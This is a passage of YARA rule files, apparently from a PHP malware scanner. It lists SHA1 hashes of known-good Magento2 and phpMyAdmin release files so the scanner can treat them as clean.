		hash.sha1(0, filesize) == "c130c0553897052c22eba031eb234f34a440ee12" or // dev/tests/api-functional/framework/bootstrap.php
		hash.sha1(0, filesize) == "3156b1477f7b924c72a5d277f5b5e321ddf7e5ef" or // dev/tests/integration/framework/bootstrap.php
		hash.sha1(0, filesize) == "b900ac374f064046262e00d5005a81345f142e68" or // dev/tests/integration/testsuite/Magento/Framework/Image/Adapter/InterfaceTest.php
		hash.sha1(0, filesize) == "50215084a2d1c6680f84037560f9f7c38f8b50d2" or // dev/tests/static/testsuite/Magento/Test/Legacy/ObsoleteCodeTest.php
		hash.sha1(0, filesize) == "53afa63b4d6c0225dacf5a415303bc4d37a78293" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		hash.sha1(0, filesize) == "a5153b12896785bdb61576ffe6a087cf0ee5f288" or // dev/tests/static/testsuite/Magento/Test/Integrity/DependencyTest.php
		hash.sha1(0, filesize) == "29b626fbd91b2bbac0e6b8e1a6319f4b3a194e3d" or // lib/internal/Magento/Framework/Shell.php
		hash.sha1(0, filesize) == "a8a7eca1c7e1537d4dd5a29f9dba9ee527778d8e" or // lib/internal/Magento/Framework/View/Design/Theme/Validator.php
		hash.sha1(0, filesize) == "4e0e218e27b5e21ca4884638459b5b382097c162" or // lib/internal/Magento/Framework/View/Model/Layout/Merge.php
		hash.sha1(0, filesize) == "9458004e6cbcf3bb8a46e6d3ed1a131ffce648f4" or // lib/internal/Magento/Framework/Filter/Test/Unit/TranslitTest.php
		hash.sha1(0, filesize) == "90493ac76005304e9cc8b8501217417eb7f46b74" or // lib/internal/Magento/Framework/Api/Code/Generator/ExtensionAttributesGenerator.php
		hash.sha1(0, filesize) == "5df3a83a6b78c80693b0fd9b1e92c02229e02abf" or // lib/internal/Magento/Framework/Validator/Constraint/Option/Callback.php
		hash.sha1(0, filesize) == "368ae2496b85f80b771dc11ddfed4a8f68db368f" or // lib/internal/Magento/Framework/Shell/Driver.php
		hash.sha1(0, filesize) == "1ed9b8d05f8f0f430af2a5886a7394156809d034" or // setup/src/Magento/Setup/Model/FixtureGenerator/BundleProductGenerator.php
		hash.sha1(0, filesize) == "95a42e9ce7d06999cf5c3dd764b0af88c54dff86" or // setup/src/Magento/Setup/Model/FixtureGenerator/ProductGenerator.php
		hash.sha1(0, filesize) == "2523c8fc35c8664f137545e4a5ee20a431492c1b" or // vendor/phpseclib/phpseclib/phpseclib/Crypt/RSA.php
		hash.sha1(0, filesize) == "9c5371ae100c7c27c02e5de69b206719a43cfc10" or // vendor/phpseclib/phpseclib/phpseclib/Math/BigInteger.php
		
		/* Magento2 2.1.14 */
		
		/* Magento2 2.2.0 */
		hash.sha1(0, filesize) == "b6db2ab078b844581bca4a7738a09301b001a616" or // app/code/Magento/Backend/view/adminhtml/templates/store/switcher/form/renderer/fieldset/element.phtml
		hash.sha1(0, filesize) == "afe78caf47645422b625a226bcc626f3c7ac2b0c" or // app/code/Magento/Backend/view/adminhtml/templates/widget/grid.phtml
		hash.sha1(0, filesize) == "ce662262e8069fecf6ecccff489d3104a345c405" or // app/code/Magento/Backend/view/adminhtml/templates/widget/grid/extended.phtml
		hash.sha1(0, filesize) == "14f70c016953e5666aa2ff348dd22853e876c62f" or // app/code/Magento/Backend/view/adminhtml/templates/widget/form/renderer/fieldset/element.phtml
		hash.sha1(0, filesize) == "34b8bbe912147d30f987c4ee092a73e8326e7758" or // app/code/Magento/Backend/Model/Url.php
		hash.sha1(0, filesize) == "0c16b0bea0813fd8f46d2616ad456ec9fa56689e" or // app/code/Magento/Quote/Api/CartRepositoryInterface.php
		hash.sha1(0, filesize) == "cd8a35413f9c1074aa1e7ec08e5618cc9536b7fa" or // app/code/Magento/Quote/Api/GuestPaymentMethodManagementInterface.php
		hash.sha1(0, filesize) == "98ffa5253645057aa3bb280ecfb50ffe3cb59afd" or // app/code/Magento/Quote/Api/PaymentMethodManagementInterface.php
		hash.sha1(0, filesize) == "0ae06d3897650908a07fe98c8cd1b7031f6e1338" or // app/code/Magento/SalesRule/Api/RuleRepositoryInterface.php
		hash.sha1(0, filesize) == "207bb68440ed72255299ece2dbee10b743b39eef" or // app/code/Magento/SalesRule/Api/CouponRepositoryInterface.php
		hash.sha1(0, filesize) == "079e6f766546e34702427f2c06f3ccb0ecb1648a" or // app/code/Magento/Sales/Api/InvoiceRepositoryInterface.php
		hash.sha1(0, filesize) == "f97aa293b22bfded923f302a135dc10af84a3b87" or // app/code/Magento/Sales/Api/TransactionRepositoryInterface.php
		hash.sha1(0, filesize) == "c5c618fbb4811d44d5e8e4fefd741cac1b51db92" or // app/code/Magento/Sales/Api/OrderItemRepositoryInterface.php
		hash.sha1(0, filesize) == "04898244b37732984fd9a9db1fb221103e19c0f8" or // app/code/Magento/Sales/Api/ShipmentRepositoryInterface.php
		hash.sha1(0, filesize) == "4a59a7a58889235c8c2e84868a8f4f6707ddb714" or // app/code/Magento/Sales/Api/CreditmemoRepositoryInterface.php
		hash.sha1(0, filesize) == "1de03af3ee8742af0cf9ff92667b70c901fc363a" or // app/code/Magento/Sales/Api/OrderRepositoryInterface.php
		hash.sha1(0, filesize) == "d801e2eea2127191b9b91f7d791762ba756ee8a9" or // app/code/Magento/Sales/view/adminhtml/templates/order/details.phtml
		hash.sha1(0, filesize) == "ffc9afc5a809197e70f2fa674e8ae4b818481584" or // app/code/Magento/Sales/view/adminhtml/templates/order/view/items.phtml
		hash.sha1(0, filesize) == "a3bd2339d5f24c3c4fed720a4cfd8aea0721c5a6" or // app/code/Magento/Sales/view/adminhtml/templates/order/view/items/renderer/default.phtml
		hash.sha1(0, filesize) == "0181a2ae1439dabb2af8f2f9233b0a76afcb20fa" or // app/code/Magento/Sales/view/adminhtml/templates/order/create/items/grid.phtml
		hash.sha1(0, filesize) == "b5e66ae20d0d97d6be5d9d0c1e369601874db3fe" or // app/code/Magento/Wishlist/view/frontend/templates/item/list.phtml
		hash.sha1(0, filesize) == "af78073d01fd1375a1c968c423dc6c655c079a5b" or // app/code/Magento/Wishlist/view/frontend/templates/item/column/cart.phtml
		hash.sha1(0, filesize) == "08fcaae7bccdf6b6e45971ed8dceabda0d6ac21b" or // app/code/Magento/SendFriend/view/frontend/templates/send.phtml
		hash.sha1(0, filesize) == "01da257f9949f057e1f4aadeb1dd9237de95c99e" or // app/code/Magento/Widget/view/adminhtml/templates/catalog/category/widget/tree.phtml
		hash.sha1(0, filesize) == "79148b03f41a7ca68b225bf4b55ebaf71b24a807" or // app/code/Magento/Tax/Api/TaxClassRepositoryInterface.php
		hash.sha1(0, filesize) == "7372bd4e85514ec15505b5713c503858d0f2b3ee" or // app/code/Magento/Tax/Api/TaxRuleRepositoryInterface.php
		hash.sha1(0, filesize) == "1818d990e5d11b0cbff9f4f087b82f519ddbdd0e" or // app/code/Magento/Tax/Api/TaxRateRepositoryInterface.php
		hash.sha1(0, filesize) == "8e564e0a37cc7415242eb40f27219d8faa6b31ac" or // app/code/Magento/Checkout/view/frontend/templates/cart/item/default.phtml
		hash.sha1(0, filesize) == "44c7222533b59f34b18f024d690ca0538549709f" or // app/code/Magento/Review/view/frontend/templates/customer/list.phtml
		hash.sha1(0, filesize) == "40fe1c9cb835f97037a9cd658dfcaa83ba60573a" or // app/code/Magento/Captcha/view/frontend/templates/default.phtml
		hash.sha1(0, filesize) == "0b021ba9ecf368d0de1322cd30204f72044fb881" or // app/code/Magento/Captcha/view/adminhtml/templates/default.phtml
		hash.sha1(0, filesize) == "f2cc39f08f1d7443928602f5deeb3082e47b7694" or // app/code/Magento/Theme/Test/Unit/Model/Design/Backend/FileTest.php
		hash.sha1(0, filesize) == "ad3da30d309429604417dd4b0297b4d773ff2670" or // app/code/Magento/Bundle/view/base/templates/product/price/tier_prices.phtml
		hash.sha1(0, filesize) == "65527739573da193f845f9a8622004f40a128b47" or // app/code/Magento/Shipping/view/adminhtml/templates/order/tracking/view.phtml
		hash.sha1(0, filesize) == "1518288cb19835a65baa67a024dd110401be0f10" or // app/code/Magento/Msrp/view/frontend/templates/render/item/price_msrp_item.phtml
		hash.sha1(0, filesize) == "21ac5cc041e00fec66eec002e8e983f459254b7a" or // app/code/Magento/Msrp/view/base/templates/product/price/msrp.phtml
		hash.sha1(0, filesize) == "dd796a759222f12779bef3ab3ced780c8f3d89a8" or // app/code/Magento/Downloadable/view/adminhtml/templates/product/edit/downloadable/samples.phtml
		hash.sha1(0, filesize) == "43ac934baf978b89030311f5a55e96d149a0e9ca" or // app/code/Magento/AdminNotification/view/adminhtml/templates/toolbar_entry.phtml
		hash.sha1(0, filesize) == "e5aa32e8c86107a517d6b74067a87a41e1c0dc43" or // app/code/Magento/Reports/view/frontend/templates/widget/compared/column/compared_default_list.phtml
		hash.sha1(0, filesize) == "4514dbaabb5bc4870233cd8d7b2d610c6c85bde6" or // app/code/Magento/Reports/view/frontend/templates/widget/compared/content/compared_grid.phtml
		hash.sha1(0, filesize) == "01e3bc7d3eadddff9ee630ea43835b88b5218975" or // app/code/Magento/Reports/view/frontend/templates/widget/compared/content/compared_list.phtml
		hash.sha1(0, filesize) == "8ba84ae0118091693c08531e7fbeb9405aeeb27b" or // app/code/Magento/Reports/view/frontend/templates/widget/viewed/column/viewed_default_list.phtml
		hash.sha1(0, filesize) == "662b14890cd60c4608b7b835e634852eed1f54ca" or // app/code/Magento/Reports/view/frontend/templates/widget/viewed/column/viewed_images_list.phtml
		hash.sha1(0, filesize) == "2137d2c24baa2f18f1f01c98efc0cd44b6b95cbd" or // app/code/Magento/Reports/view/frontend/templates/widget/viewed/content/viewed_list.phtml
		hash.sha1(0, filesize) == "bc5b153e7c4992793ebe7202fc261585b42d934b" or // app/code/Magento/Reports/view/frontend/templates/widget/viewed/content/viewed_grid.phtml
		hash.sha1(0, filesize) == "5324e08305e04a14af969c2885c304915ca8ef8a" or // app/code/Magento/Customer/Test/Unit/Controller/Account/EditPostTest.php
		hash.sha1(0, filesize) == "da8611c59ea795d8da55cba0e2ecadec4b1980dc" or // app/code/Magento/Customer/Api/GroupRepositoryInterface.php
		hash.sha1(0, filesize) == "0cf2358bfe71370b5933f697a20173f6a77966cf" or // app/code/Magento/Customer/Api/CustomerRepositoryInterface.php
		hash.sha1(0, filesize) == "54dae744d92fbd1e846a72acadf1a6f84fb4e4bf" or // app/code/Magento/Catalog/view/frontend/templates/product/image_with_borders.phtml
		hash.sha1(0, filesize) == "da3739beeb859ec0a604b8973537223b9929f0bc" or // app/code/Magento/Catalog/view/frontend/templates/product/listing.phtml
		hash.sha1(0, filesize) == "cbd37a04f47f4b41a056f64a48c20c7b3ebe1059" or // app/code/Magento/Catalog/view/frontend/templates/product/list.phtml
		hash.sha1(0, filesize) == "ebb7de64e8b564c9cc2537b64873e45f8d897f9b" or // app/code/Magento/Catalog/view/frontend/templates/product/widget/new/column/new_default_list.phtml
		hash.sha1(0, filesize) == "d729b49bd79eb095c2ee18840332104b6af101e5" or // app/code/Magento/Catalog/view/frontend/templates/product/widget/new/content/new_grid.phtml
		hash.sha1(0, filesize) == "b73df2971f39ea069f5ff603968317d4cf0e0eeb" or // app/code/Magento/Catalog/view/frontend/templates/product/widget/new/content/new_list.phtml
		hash.sha1(0, filesize) == "7bcecca698ca026a18d1c0cd6e331d4f01eb1543" or // app/code/Magento/Catalog/view/frontend/templates/product/list/items.phtml
		hash.sha1(0, filesize) == "9204037f1c67ab821f39968485878197f08ebbe9" or // app/code/Magento/Catalog/view/base/templates/product/price/tier_prices.phtml
		hash.sha1(0, filesize) == "7baae16a321991eff163cf6d353c3c80c181068e" or // app/code/Magento/Catalog/view/adminhtml/templates/catalog/product/attribute/options.phtml
		hash.sha1(0, filesize) == "1bef553f7eb2283e8b01157976f26a0337288b9c" or // app/code/Magento/Catalog/view/adminhtml/templates/catalog/product/attribute/set/main.phtml
		hash.sha1(0, filesize) == "83ab7e20e3b06491fc1955f8fc7c44d9f1da0461" or // app/code/Magento/Catalog/view/adminhtml/templates/catalog/form/renderer/fieldset/element.phtml
		hash.sha1(0, filesize) == "2b3d818faf3f19e9b209214e5ae269ec56f0f767" or // app/code/Magento/Catalog/view/adminhtml/templates/catalog/category/tree.phtml
		hash.sha1(0, filesize) == "af41b79ef688e3b085febdcf3c1fdcfac2a52604" or // app/code/Magento/Catalog/view/adminhtml/templates/catalog/category/widget/tree.phtml
		hash.sha1(0, filesize) == "3eda25a37ba1020ed42cf8473f21939675431823" or // app/code/Magento/Catalog/Model/Product/Image.php
		hash.sha1(0, filesize) == "d3c540171d56f22ba4b56d54bfca2b9b9237d5c9" or // app/code/Magento/CatalogSearch/view/frontend/templates/result.phtml
		hash.sha1(0, filesize) == "ccc3f04e8cbd3c16a047ef32ddd027949074923d" or // app/code/Magento/GroupedProduct/view/adminhtml/templates/catalog/product/composite/fieldset/grouped.phtml
		hash.sha1(0, filesize) == "9972746ccc65347da99374bff4c0db476918a025" or // app/code/Magento/Eav/Api/AttributeSetRepositoryInterface.php
		hash.sha1(0, filesize) == "ffe737082a4b67be6fecf8a49bcd9f9be2a4ebc9" or // dev/tests/js/JsTestDriver/run_js_tests.php
		hash.sha1(0, filesize) == "6f0496267604509f0b503df35e457402c52efc60" or // dev/tests/integration/testsuite/Magento/Framework/Image/Adapter/InterfaceTest.php
		hash.sha1(0, filesize) == "8575bd806d0585be272180dd48e9bb29bd23bd41" or // dev/tests/static/testsuite/Magento/Test/Legacy/ObsoleteCodeTest.php
		hash.sha1(0, filesize) == "6f6fc4f538cadc28ddd6c34b0b621e1d1f3694be" or // dev/tests/static/testsuite/Magento/Test/Legacy/_files/obsolete_classes.php
		hash.sha1(0, filesize) == "43a229164a52722b65e342fefe66384c376fc3e6" or // dev/tests/static/testsuite/Magento/Test/Integrity/DependencyTest.php
		hash.sha1(0, filesize) == "5ff6371675c12bcb8220e4e7ae2de389cf93c9b0" or // lib/web/tiny_mce/tiny_mce_jquery_src.js
		hash.sha1(0, filesize) == "1cf08f4739f91ac22a1db82b2fbf5371c5dced70" or // lib/web/tiny_mce/tiny_mce_prototype_src.js
		hash.sha1(0, filesize) == "1c6d46cc48f55aeee643ac8dfb81307c538240ee" or // lib/web/tiny_mce/tiny_mce_src.js
		hash.sha1(0, filesize) == "87afdc3d9e944d395a589228fd67d21e88a88546" or // lib/internal/Magento/Framework/Shell.php
		hash.sha1(0, filesize) == "66689eb745afaccd13b86a635663a70c68979839" or // lib/internal/Magento/Framework/View/Model/Layout/Merge.php
		hash.sha1(0, filesize) == "cc769ea55968156fe55010ec8f342f326c4892bf" or // lib/internal/Magento/Framework/Filter/Test/Unit/TranslitTest.php
		hash.sha1(0, filesize) == "af2c52546d499780ffab9305c09712c226153b30" or // lib/internal/Magento/Framework/Api/Code/Generator/ExtensionAttributesGenerator.php
		hash.sha1(0, filesize) == "637424f32393446c14e84e5ccdc523b799d5a62c" or // lib/internal/Magento/Framework/Shell/Driver.php
		hash.sha1(0, filesize) == "a4eea004d560338df63eb552c5255ec0956b447a" or // setup/src/Magento/Setup/Model/FixtureGenerator/BundleProductGenerator.php
		hash.sha1(0, filesize) == "b4b7e15e1c2586281bc859487e175bf162ad09a8" or // vendor/friendsofphp/php-cs-fixer/CHANGELOG.md
		hash.sha1(0, filesize) == "a3bb9711fc5f3fd102e83a784b18fbecbdf51e56" or // vendor/friendsofphp/php-cs-fixer/src/Tokenizer/Transformer/CurlyBraceTransformer.php
		hash.sha1(0, filesize) == "30ca0624b916566d59d375f8dcb981fe0bbe80fe" or // vendor/friendsofphp/php-cs-fixer/src/Fixer/Phpdoc/PhpdocAlignFixer.php
		hash.sha1(0, filesize) == "b40c17220eb892683bdbe49dafb99f3544b9707a" or // vendor/friendsofphp/php-cs-fixer/src/Fixer/Phpdoc/PhpdocSummaryFixer.php
		hash.sha1(0, filesize) == "b578dadd560b9fa5e6c7cc534e43c58b933d0ee8" or // vendor/zendframework/zend-config/src/Reader/Json.php
		hash.sha1(0, filesize) == "d0f531929accaa989747bce64e5d1d18619c266d" or // vendor/zendframework/zend-config/src/Reader/Yaml.php
		hash.sha1(0, filesize) == "c3efc47e0a6f3d2ce786d65903ba4bf7b18b8465" or // vendor/zendframework/zend-config/src/Reader/Ini.php
		hash.sha1(0, filesize) == "8e0199d56990d9548e906c7f43d8b6a0acc91b09" or // vendor/zendframework/zend-config/src/Reader/JavaProperties.php
		hash.sha1(0, filesize) == "49005b49d6358ba62e1e63b062549e6be44e84c5" or // vendor/zendframework/zend-i18n/src/Validator/IsFloat.php
		hash.sha1(0, filesize) == "7ebb06e9d13316c1b9014d89a80335a5801534de" or // vendor/zendframework/zend-view/src/Helper/Navigation/AbstractHelper.php
		hash.sha1(0, filesize) == "2a8ad0ada4579b7a093258b53fd654726a39b82f" or // vendor/zendframework/zend-soap/src/Client.php
		hash.sha1(0, filesize) == "5d0abe2949deabd3c8402a53e1335ec1a1a10a7a" or // vendor/monolog/monolog/src/Monolog/Formatter/LineFormatter.php
		hash.sha1(0, filesize) == "679d1e5f586fd2c0604d49035d07ee76fa80b4eb" or // vendor/symfony/console/Application.php
		hash.sha1(0, filesize) == "c77c8aa209d8ce38742a83a569b37d2c4d86960a" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		hash.sha1(0, filesize) == "dcc4d118f3df90212cc0f83562a6526b57839510" or // vendor/squizlabs/php_codesniffer/src/Standards/Generic/Tests/Arrays/DisallowLongArraySyntaxUnitTest.inc
		hash.sha1(0, filesize) == "ce5d95770d202ca5ca20351d0809c44973614361" or // vendor/squizlabs/php_codesniffer/src/Reports/Emacs.php
		hash.sha1(0, filesize) == "32f8aa52981b30d5b6b9ad3064e6c4835292611e" or // vendor/phpspec/prophecy/src/Prophecy/Argument/Token/ApproximateValueToken.php
		hash.sha1(0, filesize) == "83f41387b29273eb40aefd1135e9e361c867631d" or // vendor/paragonie/random_compat/lib/random.php
		hash.sha1(0, filesize) == "c4d30424cccf6ec0f7419ee7a5f23db7a7c4b4e5" or // vendor/composer/composer/src/Composer/Util/Git.php
		hash.sha1(0, filesize) == "27e9cf7038646a28442aa46d37a28ec8e8716df1" or // vendor/composer/composer/src/Composer/Console/Application.php
		hash.sha1(0, filesize) == "9e225727717be62c96ce263044b4a26368d6b1f8" or // vendor/composer/composer/src/Composer/Json/JsonManipulator.php
		hash.sha1(0, filesize) == "dfe5659d01d976f2c204d7d38f24202747a7249f" or // vendor/composer/composer/src/Composer/Command/ShowCommand.php
		hash.sha1(0, filesize) == "d2d335780856a9bb3e75aa80d955455866dd9918" or // vendor/composer/composer/src/Composer/Command/ConfigCommand.php
		hash.sha1(0, filesize) == "3f3e243765fc816c8b654cd2eeb31ccbfffd876c" or // vendor/sebastian/environment/src/Console.php
		hash.sha1(0, filesize) == "1f7106a3fecd6a51f579d358089fc57a8249b6bd" or // vendor/phpunit/phpunit/src/Util/Log/TeamCity.php
		
		/* Magento2 2.2.1 */
		hash.sha1(0, filesize) == "7b4ca1bdf6da1b74bbb0e79cd5dca7e9358736fc" or // vendor/symfony/console/Application.php
		hash.sha1(0, filesize) == "793f57e591242b263cdb8f438b487218eb222602" or // vendor/symfony/dependency-injection/Dumper/PhpDumper.php
		
		/* Magento2 2.2.2 */
		hash.sha1(0, filesize) == "5c9d6542625efa7d9598d8670810fb4d2348c372" or // app/code/Magento/Customer/Api/CustomerRepositoryInterface.php
		hash.sha1(0, filesize) == "1ef0a76c00bbb37bbfc517675da2e6e75d6c69a4" or // app/code/Magento/Catalog/view/frontend/templates/product/list/items.phtml
		hash.sha1(0, filesize) == "bd9313c7fbeba61c905a3b9c13000d3c5316aa9c" or // app/code/Magento/Catalog/view/adminhtml/templates/catalog/category/tree.phtml
		hash.sha1(0, filesize) == "cbe1572a603dad3fbdaace2c9aeaf437db0c399d" or // lib/internal/Magento/Framework/View/Model/Layout/Merge.php
		hash.sha1(0, filesize) == "0fc99eccb4f7e3841f1f05a3acd274f44d07d784" or // vendor/friendsofphp/php-cs-fixer/CHANGELOG.md
		hash.sha1(0, filesize) == "f897f0201b4182cb13eb4fb07e6f685134f79e1d" or // vendor/friendsofphp/php-cs-fixer/src/Tokenizer/Transformer/CurlyBraceTransformer.php
		hash.sha1(0, filesize) == "18ceffbba547979679a41af4e1a1fb50673b521b" or // vendor/friendsofphp/php-cs-fixer/src/Fixer/Phpdoc/PhpdocAlignFixer.php
		hash.sha1(0, filesize) == "77d1c0c1403658f3b695ea297c62d3123a2d2afa" or // vendor/friendsofphp/php-cs-fixer/src/Fixer/Phpdoc/PhpdocSummaryFixer.php
		hash.sha1(0, filesize) == "767c952605047fe1d2b6cde9ea959fa7419bf446" or // vendor/symfony/console/Application.php
		hash.sha1(0, filesize) == "e806c939435bf2184070293d5f0e5786b0e260e4" or // vendor/squizlabs/php_codesniffer/src/Standards/Squiz/Tests/Arrays/ArrayDeclarationUnitTest.1.inc
		hash.sha1(0, filesize) == "1e60b0a55c7010e44d1984dd3429faae582d66ab" or // vendor/squizlabs/php_codesniffer/src/Standards/Squiz/Tests/Arrays/ArrayDeclarationUnitTest.1.inc.fixed
		
		/* Magento2 2.2.3 */
		hash.sha1(0, filesize) == "3d02e278b1aa38f9bc8ac8ce11a2b7507c67c4db" or // app/code/Magento/Checkout/view/frontend/templates/cart/item/default.phtml
		hash.sha1(0, filesize) == "097a07a8a48dcd13a0c3b8125b3b41fa5b89aeba" or // app/code/Magento/Downloadable/view/adminhtml/templates/product/edit/downloadable/samples.phtml
		hash.sha1(0, filesize) == "ec460f47a07de4973809bf83892325a053ab79d1" or // app/code/Magento/Catalog/view/frontend/templates/product/list.phtml
		hash.sha1(0, filesize) == "9bbeb014444ce6c87048116cd3ac6b0cf1cf7c76" or // app/code/Magento/Catalog/view/adminhtml/templates/catalog/product/attribute/set/main.phtml
		hash.sha1(0, filesize) == "5442561bcc0385b43e0fe5a68ccf98bbdec5ca72" or // vendor/friendsofphp/php-cs-fixer/CHANGELOG.md
		hash.sha1(0, filesize) == "bea5262b4308701259351b7d7ebbb718fedb60cb" or // vendor/friendsofphp/php-cs-fixer/src/Fixer/Phpdoc/PhpdocAlignFixer.php
		hash.sha1(0, filesize) == "c1ca941e582ca86847dde4197d6369dd48adc895" or // vendor/friendsofphp/php-cs-fixer/src/Fixer/Phpdoc/PhpdocSummaryFixer.php
		hash.sha1(0, filesize) == "a33b73c4bb7d6b481092b146c92f2ce76971783e" or // vendor/zendframework/zend-soap/src/Client.php
		hash.sha1(0, filesize) == "33f2a3d42332b90bd774681ea1a35645f18e6613" or // vendor/symfony/console/Application.php
		hash.sha1(0, filesize) == "e9a33f8a16f28125962bdcd2fd692171cb5e50e7" or // vendor/squizlabs/php_codesniffer/src/Standards/Generic/Tests/WhiteSpace/ScopeIndentUnitTest.2.inc.fixed
		hash.sha1(0, filesize) == "6148ebd6cb92f7d126f584cc28bc2dae00d420f8" or // vendor/squizlabs/php_codesniffer/src/Standards/Generic/Tests/WhiteSpace/ScopeIndentUnitTest.1.inc.fixed
		hash.sha1(0, filesize) == "1e6dfa2f9ca1655679ef3372b9b5adecf7950250" or // vendor/squizlabs/php_codesniffer/src/Standards/Generic/Tests/WhiteSpace/ScopeIndentUnitTest.2.inc
		hash.sha1(0, filesize) == "b6558129f141c2872fd3bababa30fa2197f464c8" or // vendor/squizlabs/php_codesniffer/src/Standards/Generic/Tests/WhiteSpace/ScopeIndentUnitTest.1.inc
		hash.sha1(0, filesize) == "dcc4d118f3df90212cc0f83562a6526b57839510" or // vendor/squizlabs/php_codesniffer/src/Standards/Generic/Tests/Arrays/DisallowLongArraySyntaxUnitTest.1.inc
		hash.sha1(0, filesize) == "e6916494d90eab4a3cb2cd60cecdbeb606c78036" or // vendor/squizlabs/php_codesniffer/src/Standards/Squiz/Tests/WhiteSpace/OperatorSpacingUnitTest.inc
		hash.sha1(0, filesize) == "0125f48763b161a35ede5618b3fa554061a64ed6" or // vendor/squizlabs/php_codesniffer/src/Standards/Squiz/Tests/WhiteSpace/OperatorSpacingUnitTest.inc.fixed
		
		/* Magento2 2.2.4 */
		hash.sha1(0, filesize) == "f023851dc5ec2d325b9b29b202afc79e487adeff" or // app/code/Magento/Backend/view/adminhtml/templates/widget/grid/extended.phtml
		hash.sha1(0, filesize) == "7991cdeefa71c33b030c8146c547b56bf19a35b6" or // app/code/Magento/Backend/Model/Url.php
		hash.sha1(0, filesize) == "a4c0e1b01b752273f623267773d4b0941f5ec91f" or // app/code/Magento/Captcha/view/frontend/templates/default.phtml
		hash.sha1(0, filesize) == "2f4f179b463d43d7125c0edf96207cdaac0d3553" or // app/code/Magento/Captcha/view/adminhtml/templates/default.phtml
		hash.sha1(0, filesize) == "88688495df8a381a7e2f8c7d78244dc5aa3e449f" or // app/code/Magento/Catalog/view/frontend/templates/product/list/items.phtml
		hash.sha1(0, filesize) == "bc14eb76d717597ea55e5a059ac9027f9e37c41e" or // app/code/Magento/Catalog/view/adminhtml/templates/catalog/product/attribute/options.phtml
		hash.sha1(0, filesize) == "f5ff153b3ce5fe74d8555fafc7c4f5b338e72cd9" or // app/code/Magento/Catalog/Model/Product/Image.php
		hash.sha1(0, filesize) == "94295c58e11d35c4384bd5533a56b251b3a9f899" or // app/code/Magento/CatalogWidget/view/frontend/templates/product/widget/content/grid.phtml
		hash.sha1(0, filesize) == "caa1cdbac108de22eb304a1001b6387d66d3c8d1" or // dev/tests/integration/testsuite/Magento/Framework/Image/Adapter/InterfaceTest.php
		hash.sha1(0, filesize) == "554d4e860b7c9ac7e748634db8f2ce7d8a84de34" or // vendor/friendsofphp/php-cs-fixer/CHANGELOG.md
		hash.sha1(0, filesize) == "771f8a7b6cefa10280c8ca3664a481b89f97dc51" or // vendor/friendsofphp/php-cs-fixer/src/Tokenizer/Transformer/CurlyBraceTransformer.php
		hash.sha1(0, filesize) == "2c86d6b8985585facf4b82b459129890e67a8585" or // vendor/friendsofphp/php-cs-fixer/src/Fixer/Phpdoc/PhpdocAlignFixer.php
		hash.sha1(0, filesize) == "205f447fdd5382d4cec93066916bc36593117b89" or // vendor/paragonie/random_compat/lib/random.php
		
		/* Magento2 2.2.5 */
		hash.sha1(0, filesize) == "896c509fd0d3a1b2c5c68a31078c07227012ad87" or // dev/tests/static/testsuite/Magento/Test/Integrity/DependencyTest.php
		hash.sha1(0, filesize) == "fdf2c68d82619b50dcbb254cc1378c7ae19fc410" or // vendor/friendsofphp/php-cs-fixer/CHANGELOG.md
		hash.sha1(0, filesize) == "0c4aaf74d31d6553acdee867a44439f7b2e58c01" or // vendor/friendsofphp/php-cs-fixer/src/Fixer/Phpdoc/PhpdocAlignFixer.php
		hash.sha1(0, filesize) == "e2615e1467ebca61785a35d1f3716fd144722527" or // vendor/friendsofphp/php-cs-fixer/src/Fixer/Phpdoc/PhpdocSummaryFixer.php
		hash.sha1(0, filesize) == "163720043b85199587fd2183a1311dacb3cec5c1" or // vendor/paragonie/random_compat/lib/random.php
		
		false
}
/* Copyright (C) NBS System - All Rights Reserved
   Licensed under GNU LGPL v3.0 – See the LICENSE notice for details
*/

import "hash"

private rule Phpmyadmin
{
    meta:
        generated = "2018-05-30T12:35:38.661805"

    condition:
        /* Phpmyadmin 4.0.0 */
        hash.sha1(0, filesize) == "1055b5023001d995d1a42e9e25731b621b3a1b78" or // libraries/plugins/auth/swekey/swekey.auth.lib.php
        hash.sha1(0, filesize) == "df4108af17881e331feeeeef9ec35ef4b2fff87c" or // libraries/select_lang.lib.php
        hash.sha1(0, filesize) == "534f0c81f69b78a3c0cd64748f55d86effa94d96" or // server_databases.php
        hash.sha1(0, filesize) == "1f1d01182cf376eb7cc463cb67334c98166f3033" or // libraries/build_html_for_db.lib.php
        hash.sha1(0, filesize) == "ca17eb55ded8f62e7339e20d699f1e43a52df778" or // pmd_relation_upd.php
        hash.sha1(0, filesize) == "82cff5aa0109bab26bd5e53f9928fa8cb1d21d18" or // locale/da/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "0401e8fdf617610e6da72c8a75c7ff0bf0e2a1e7" or // pmd_relation_new.php
        hash.sha1(0, filesize) == "be3ea7a4f914387dc71531c2479867ee65dfe947" or // locale/ja/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "8b2f9bb37f25ed57bb7497d4dc9c98a042dd367e" or // gis_data_editor.php
        hash.sha1(0, filesize) == "0e76cbda3599c8139f6a8a5c6c17f6abc3835397" or // doc/doctrees/faq.doctree
        hash.sha1(0, filesize) == "a4e970da05605cfe12b0897c111e475bb1ceeea3" or // doc/doctrees/config.doctree
        hash.sha1(0, filesize) == "2905b3fe33a09435b76675a8728e461f3ac5f9e0" or // doc/html/_sources/faq.txt
        hash.sha1(0, filesize) == "68c477fe016abd4236ee25717c7c736d400f1b58" or // libraries/DisplayResults.class.php
        hash.sha1(0, filesize) == "2905b3fe33a09435b76675a8728e461f3ac5f9e0" or // doc/faq.rst

        /* Phpmyadmin 4.0.1 */
        hash.sha1(0, filesize) == "8a47d5c1f34e15094d4a6264cda406b943e021c4" or // locale/sl/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "75f8ad7de654ad3bbc274528996a954bcc1785bc" or // locale/ja/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "833ccf4a4016a1b9594db0469f22e08688ef345a" or // doc/doctrees/faq.doctree
        hash.sha1(0, filesize) == "40d47a7e9786f77e63ffeb444cd529e88e22498f" or // doc/doctrees/config.doctree
        hash.sha1(0, filesize) == "4e93c2797c64b3754694b69d3135e7a09f805a86" or // libraries/DisplayResults.class.php

        /* Phpmyadmin 4.0.2 */
        hash.sha1(0, filesize) == "9354e4058a1efa8aa73918eb2bd45f5cd8777485" or // locale/ko/LC_MESSAGES/phpmyadmin.mo
